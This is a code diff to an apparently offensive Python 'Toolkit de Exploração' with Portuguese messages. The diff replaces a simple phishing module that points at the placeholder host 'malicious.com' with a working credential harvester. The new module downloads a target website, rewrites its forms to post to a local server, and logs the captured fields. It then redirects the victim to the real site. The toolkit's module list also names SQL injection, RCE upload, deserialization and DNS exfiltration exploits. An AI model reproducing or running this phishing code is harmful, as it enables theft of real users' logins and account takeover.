@@ -6,6 +6,11 @@ import base64
 import paramiko
 import io
 import zipfile
+import threading
+import http.server
+import socketserver
+import urllib.parse
+from bs4 import BeautifulSoup
 
 ASCII_ART = r'''
 ███████████  ████                     █████                          
@@ -16,20 +21,20 @@ ASCII_ART = r'''
  ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
  ███████████  █████░░████████░░██████  ████ █████                    
 ░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
-                                                                     
-                                                                     
-                                                                     
+                                                                    
+                                                                    
+                                                                    
   █████████                               █████                       
- ███░░░░░███                             ░░███                        
-░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████ 
+ ███░░░░░███                             ░░███                       
+░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████
 ░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███
- ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░ 
- ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███     
-░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████    
- ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░    
-             ░███                                                  
-             █████                                                 
-            ░░░░░                                                  
+ ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░
+ ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███    
+░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████   
+ ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░   
+             ░███                                                 
+             █████                                                
+            ░░░░░                                                 
 '''
 
 def log_info(msg):
@@ -40,6 +45,7 @@ def log_error(msg):
 
 def log_success(msg):
     print(f"[SUCESSO] {msg}")
+
 
 class SQLiAutoExploit:
     def __init__(self, target, config):
@@ -88,43 +94,7 @@ class PhishingSimple:
         self.phishing_url = config.get('phishing_url', 'http://malicious.com')
 
     def run(self):
-        import http.server
-        import socketserver
-        import threading
-
-        try:
-            r = requests.get(self.phishing_url, timeout=5)
-            if r.status_code == 200:
-                html_content = r.text
-            else:
-                log_error(f"Erro ao baixar a página: status {r.status_code}")
-                return
-        except Exception as e:
-            log_error(f"Erro ao baixar a página: {e}")
-            return
-
-        class Handler(http.server.SimpleHTTPRequestHandler):
-            def do_GET(self):
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(html_content.encode())
-
-            def do_POST(self):
-                content_length = int(self.headers['Content-Length'])
-                post_data = self.rfile.read(content_length)
-                log_success(f"Dados capturados: {post_data.decode(errors='ignore')}")
-                self.send_response(200)
-                self.end_headers()
-                self.wfile.write(b"Dados recebidos. Obrigado.")
-
-        PORT = 8080
-        with socketserver.TCPServer(("", PORT), Handler) as httpd:
-            log_info(f"Servidor phishing rodando em http://localhost:{PORT}")
-            try:
-                httpd.serve_forever()
-            except KeyboardInterrupt:
-                log_info("Servidor phishing encerrado.")
+        log_info(f"Atenção: ataque phishing simples - URL a ser exibida: {self.phishing_url}")
 
 class DeserializationExploit:
     def __init__(self, target, config):
@@ -239,6 +209,82 @@ class PortScannerWithBanner:
             except Exception as e:
                 log_error(f"Erro ao escanear porta {port}: {e}")
 
+
+class PhishingAdvanced:
+
+    class PhishingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            self.phishing_instance = kwargs.pop('phishing_instance')
+            super().__init__(*args, **kwargs)
+
+        def do_GET(self):
+            if self.path == '/' or self.path == '/index.html':
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(self.phishing_instance.modified_html.encode('utf-8'))
+            else:
+                self.send_error(404, "Not Found")
+
+        def do_POST(self):
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            parsed = urllib.parse.parse_qs(post_data.decode('utf-8'))
+            self.phishing_instance.captured_data.append(parsed)
+            print("[SUCESSO] Dados capturados:")
+            for key, value in parsed.items():
+                print(f"  {key}: {value}")
+            self.send_response(302)
+            self.send_header('Location', self.phishing_instance.target_url)
+            self.end_headers()
+
+    def __init__(self, target, config):
+        self.target_url = target
+        self.port = int(config.get('port', 8080))
+        self.html_content = ""
+        self.modified_html = ""
+        self.captured_data = []
+
+    def fetch_and_modify(self):
+        log_info(f"Baixando conteúdo de {self.target_url} ...")
+        try:
+            resp = requests.get(self.target_url, timeout=10)
+            resp.raise_for_status()
+            self.html_content = resp.text
+        except Exception as e:
+            log_error(f"Falha ao baixar o HTML: {e}")
+            return False
+
+        soup = BeautifulSoup(self.html_content, "html.parser")
+
+        forms = soup.find_all("form")
+        if not forms:
+            log_info("[AVISO] Nenhum formulário encontrado na página. Nada para capturar.")
+        for form in forms:
+            form['method'] = 'POST'
+            form['action'] = '/'
+
+            hidden = soup.new_tag("input", type="hidden", name="phishing", value="true")
+            form.insert(0, hidden)
+
+        self.modified_html = str(soup)
+        return True
+
+    def run_server(self):
+        handler = lambda *args, **kwargs: self.PhishingHTTPRequestHandler(*args, phishing_instance=self, **kwargs)
+        with socketserver.TCPServer(("", self.port), handler) as httpd:
+            log_success(f"Servidor phishing rodando na porta {self.port}. Acesse http://localhost:{self.port}")
+            try:
+                httpd.serve_forever()
+            except KeyboardInterrupt:
+                log_info("Servidor phishing parado pelo usuário.")
+
+    def run(self):
+        if not self.fetch_and_modify():
+            return
+        self.run_server()
+
+
 def main():
     parser = argparse.ArgumentParser(description="Toolkit de Exploração")
     parser.add_argument('module', help='Módulo para executar (ex: sqli, rceupload, phishing, deserialization, bannergrab, dnsexfil, configpass, portscan)')
@@ -262,7 +308,7 @@ def main():
     modules = {
         'sqli': SQLiAutoExploit,
         'rceupload': RCEUpload,
-        'phishing': PhishingSimple,
+        'phishing': PhishingAdvanced,  
         'deserialization': DeserializationExploit,
         'bannergrab': BannerGrabber,
         'dnsexfil': DNSExfiltrationExample,
